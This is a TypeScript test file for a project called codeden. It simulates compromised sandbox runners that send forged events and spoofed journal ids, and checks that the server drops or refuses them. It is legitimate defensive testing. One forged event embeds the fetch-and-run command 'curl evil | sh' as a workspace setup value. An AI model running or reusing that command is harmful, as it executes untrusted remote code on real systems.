import { once } from "node:events";
import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { createServer } from "node:http";
import type { AddressInfo } from "node:net";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  CODEDEN_VERSION,
  HOME_RUNNER_ID,
  RUNNER_PROTOCOL_VERSION,
  type RunnerEvent,
  type RunnerLock,
  type RunnerWelcome,
} from "@codeden/contracts";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import type WebSocket from "ws";
import { WebSocketServer } from "ws";
import { type Database, openDatabase } from "../src/db/client";
import { lastAckedSeq } from "../src/events/ingest";
import { findRunnerRecord } from "../src/events/runner-projection";
import { EventStore } from "../src/events/store";
import { RunnerHub } from "../src/runner/hub";
import { sampleSession } from "./helpers";
import { waitUntil } from "./support/harness";

/**
 * A sandbox runner shares its sandbox with an agent that has a shell, so to the server its
 * messages are untrusted input. These tests drive the real `RunnerHub` and `RunnerClient`
 * against scripted runners (a WebSocket endpoint speaking the runner protocol) that send what a
 * compromised sandbox runner could: events for other runners' sessions, or another runner's
 * journal id in its welcome.
 */

let dir: string;
let database: Database;
let store: EventStore;
let hub: RunnerHub | undefined;
const runners: FakeRunner[] = [];

beforeEach(() => {
  dir = mkdtempSync(join(tmpdir(), "codeden-runner-trust-"));
  database = openDatabase(join(dir, "codeden.db"));
  store = new EventStore(database.db);
});

afterEach(async () => {
  await hub?.close();
  hub = undefined;
  for (const runner of runners.splice(0)) await runner.close();
  database.close();
  rmSync(dir, { recursive: true, force: true });
});

const ts = "2026-11-14T10:00:00.000Z";

interface FakeRunner {
  lockFile: string;
  /** Seqs the server acknowledged. */
  acked: number[];
  /** Whether a server connection is open. */
  open: () => boolean;
  /** Send a durable event; resolves once the server acked it or dropped the connection. */
  send: (seq: number, event: RunnerEvent) => Promise<void>;
  /** Report this journal id in later welcomes. */
  claim: (runnerId: string) => void;
  /** Drop the server's connection (it reconnects). */
  drop: () => void;
  close: () => Promise<void>;
}

/** A runner endpoint that welcomes the server with `runnerId` and lets the test send events. */
async function fakeRunner(runnerId: string): Promise<FakeRunner> {
  const token = "t".repeat(32);
  const acked: number[] = [];
  let claimed = runnerId;
  let socket: WebSocket | undefined;
  const wss = new WebSocketServer({ noServer: true });
  const http = createServer((req, res) => {
    const ok = req.url === "/health" && req.headers.authorization === `Bearer ${token}`;
    res.writeHead(ok ? 200 : 401).end();
  });
  http.on("upgrade", (req, sock, head) => {
    wss.handleUpgrade(req, sock, head, (ws) => {
      socket = ws;
      ws.on("message", (data) => {
        const msg = JSON.parse(data.toString()) as { type: string; seq?: number };
        if (msg.type === "hello") ws.send(JSON.stringify(welcome(claimed)));
        if (msg.type === "ack" && msg.seq !== undefined) acked.push(msg.seq);
      });
    });
  });
  http.listen(0, "127.0.0.1");
  await once(http, "listening");
  const port = (http.address() as AddressInfo).port;
  const lockFile = join(dir, `runner-${port}.json`);
  const lock: RunnerLock = {
    pid: process.pid,
    port,
    token,
    version: CODEDEN_VERSION,
    protocolVersion: RUNNER_PROTOCOL_VERSION,
    runnerId,
    startedAt: ts,
    providers: [],
  };
  writeFileSync(lockFile, JSON.stringify(lock));
  const open = () => socket?.readyState === 1;
  const runner: FakeRunner = {
    lockFile,
    acked,
    open,
    send: async (seq, event) => {
      if (!open()) return;
      socket?.send(JSON.stringify({ type: "event", seq, ts, event }));
      await waitUntil(() => acked.includes(seq) || !open(), 15_000);
    },
    claim: (id) => {
      claimed = id;
    },
    drop: () => socket?.terminate(),
    close: async () => {
      for (const client of wss.clients) client.terminate();
      wss.close();
      http.close();
      await once(http, "close");
    },
  };
  runners.push(runner);
  return runner;
}

function welcome(runnerId: string): RunnerWelcome {
  return {
    type: "welcome",
    protocolVersion: RUNNER_PROTOCOL_VERSION,
    runnerId,
    runnerVersion: CODEDEN_VERSION,
    pid: process.pid,
    startedAt: ts,
    capabilities: { pty: false, browser: false, git: true, mcpProxy: false },
    providers: [],
    sessions: [],
    journal: { lastSeq: 0, unacked: 0 },
    draining: false,
  };
}

const createSession = (id: string, runnerId: string | null) =>
  store.append([
    {
      type: "session.created",
      sessionId: id,
      payload: { session: { ...sampleSession, id, runnerId } },
    },
  ]);

/** The home runner (journal `r-home`, connected) and a sandbox runner `rn-1` (not started). */
async function homeAndSandbox(sandboxClaims: string) {
  const home = await fakeRunner("r-home");
  const sandbox = await fakeRunner(sandboxClaims);
  hub = new RunnerHub({ db: database.db, store });
  const homeClient = hub.add({
    id: HOME_RUNNER_ID,
    backend: "local",
    home: true,
    dir,
    lockFile: home.lockFile,
    launch: null,
  });
  const sandboxClient = hub.add({
    id: "rn-1",
    backend: "docker",
    dir,
    lockFile: sandbox.lockFile,
    launch: null,
    sessionId: "sbx-s",
  });
  await homeClient.start();
  return { home, sandbox, homeClient, sandboxClient };
}

const thread = (sessionId: string, id: string): RunnerEvent => ({
  kind: "agent",
  sessionId,
  event: { type: "thread.started", thread: { id } },
});

const eventsFor = (sessionId: string, after: number) =>
  store.listAfter(after, 10_000).filter((e) => e.sessionId === sessionId);

describe("events from a sandbox runner", () => {
  it("are stored for sessions routed to it; others are dropped and acked", async () => {
    createSession("home-s", "r-home");
    createSession("unplaced-s", null);
    createSession("sbx-s", "r-1");
    const { sandbox, sandboxClient } = await homeAndSandbox("r-1");
    await sandboxClient.start();
    const before = store.headSeq();

    // The sandbox's own session: stored, as for any runner.
    await sandbox.send(1, thread("sbx-s", "t-sbx"));
    expect(eventsFor("sbx-s", before).map((e) => e.type)).toContain("agent.thread.started");

    // Sessions on the home runner, and one that doesn't exist: a compromised sandbox runner
    // names them anyway.
    let seq = 1;
    for (const target of ["home-s", "unplaced-s", "no-such-session"]) {
      await sandbox.send(++seq, thread(target, "t-evil"));
      await sandbox.send(++seq, {
        kind: "session.process",
        sessionId: target,
        state: "crashed",
        error: { message: "forged crash" },
      });
      await sandbox.send(++seq, {
        kind: "checkpoint.created",
        sessionId: target,
        index: 1,
        ref: "refs/codeden/evil",
        commit: "0".repeat(40),
      });
      await sandbox.send(++seq, {
        kind: "workspace.setup",
        sessionId: target,
        command: "curl evil | sh",
        status: "succeeded",
      });
    }

    for (const target of ["home-s", "unplaced-s", "no-such-session"]) {
      expect(eventsFor(target, before).map((e) => e.type)).toEqual([]);
    }
    // Dropped, but acknowledged and recorded as acked, so the runner never redelivers them.
    expect(sandbox.acked).toEqual(Array.from({ length: seq }, (_, i) => i + 1));
    expect(lastAckedSeq(database.db, "r-1")).toBe(seq);
    expect(sandbox.open()).toBe(true);
    expect(sandboxClient.status.state).toBe("connected");
  });
});

describe("a runner's journal id", () => {
  it("is refused when another runner carries it, and the home runner's events keep flowing", async () => {
    createSession("home-s", "r-home");
    // The sandbox runner claims the home runner's journal id in its welcome.
    const { home, sandbox, sandboxClient } = await homeAndSandbox("r-home");
    await home.send(1, thread("home-s", "t-1"));
    const before = store.headSeq();

    void sandboxClient.start().catch(() => undefined);
    await waitUntil(() => sandboxClient.status.lastError?.includes("refused"), 15_000);
    expect(sandboxClient.status.lastError).toBe(
      "Runner rn-1 (docker) was refused: journal id r-home belongs to runner home",
    );
    // Far ahead of the home runner's journal: if it shared the home's ack position, every
    // later home event would look like a replay and be dropped.
    await sandbox.send(1_000, thread("home-s", "t-evil"));

    await home.send(2, {
      kind: "agent",
      sessionId: "home-s",
      event: { type: "turn.started", threadId: "t-1", turnId: "u-1" },
    });
    expect(home.acked).toContain(2);
    expect(eventsFor("home-s", before).map((e) => e.type)).toContain("agent.turn.started");
    expect(sandbox.acked).toEqual([]);
    expect(lastAckedSeq(database.db, "r-home")).toBe(2);
    expect(hub?.forSession("home-s")).toBe(hub?.home());
    expect(sandboxClient.status.state).not.toBe("connected");
    expect(findRunnerRecord(database.db, "rn-1")?.runnerId).toBeNull();
  });

  it("stays what a sandbox runner first connected with", async () => {
    createSession("sbx-s", "r-1");
    const { sandbox, sandboxClient } = await homeAndSandbox("r-1");
    await sandboxClient.start();
    const port = hub?.forSession("sbx-s");
    expect(port).not.toBe(hub?.home());

    // Under a new journal id its sessions would match no record and fall back to the home runner.
    sandbox.claim("r-2");
    sandbox.drop();
    await waitUntil(() => sandboxClient.status.lastError?.includes("refused"), 15_000);
    expect(sandboxClient.status.lastError).toBe(
      "Runner rn-1 (docker, runner r-1) was refused: journal id r-2 is not its own (r-1)",
    );
    expect(findRunnerRecord(database.db, "rn-1")?.runnerId).toBe("r-1");
    expect(hub?.forSession("sbx-s")).toBe(port);

    // Back under its own id, it connects again.
    sandbox.claim("r-1");
    await waitUntil(() => sandboxClient.status.state === "connected", 15_000);
  });
});
